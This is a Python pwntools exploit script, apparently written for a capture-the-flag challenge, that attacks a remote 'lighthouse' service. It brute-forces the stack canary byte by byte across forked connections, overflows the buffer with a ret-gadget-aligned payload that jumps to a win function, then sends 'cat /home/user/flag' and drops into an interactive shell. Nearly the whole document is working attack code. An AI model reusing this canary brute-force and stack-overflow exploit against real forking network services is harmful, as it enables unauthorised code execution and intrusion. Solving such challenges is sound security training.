#!/usr/bin/env python3
from pwn import *
import time
context.log_level = 'debug'
#HOST, PORT = '0.0.0.0', 9001
HOST, PORT = 'offsec.m0lecon.it', 13550
OFFSET_TO_CANARY = 136#<-- BOF nella funzione vuln(), quindi bisogna vedere quella funzione in gdb (disass vuln()) e capire dove fa il confronto con il canary, dopo si mette un breakpoint e si fa il BOF e si osserva il valore di RAX e si trova l'offset con cyclic_find 
OFFSET_TO_RIP = OFFSET_TO_CANARY +8+8#<-- Between the canary and the saved RIP there are 8 bytes for the saved RBP. So the formula is: off-set to RIP = offset to canary + 8 (canary) + 8 (saved RBP).

ret_gadget= 0x40101a
context.binary = elf = ELF('./lighthouse', checksec=False)

#canary brute-force possible because the child of the fork have the same canary
known = b"\x00"
log.info("Start cycle")
for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b'>')
        io.sendline(b'1')
        #print(io.recvline())
        io.recvuntil(b'entry: \n')
        io.send(payload)

        try:
            data = io.recv(timeout=0.2)
            #print(data)
        except EOFError:
            data = b""
        io.close()

        if b"Log entry recorded. Over and out." in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b'>')
io.sendline(b'1')
        #print(io.recvline())
io.recvuntil(b'entry: \n')






payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(ret_gadget),    # ret gadget for alignment
    p64(elf.sym.win),
)


io.send(payload)
io.sendline(b"cat /home/user/flag")
#io.sendline(b"ls -R | grep flag")
#io.sendline(b"ls -R")
#io.sendline(b"cat /home/user/flag")

print(io.recvline())

io.interactive()



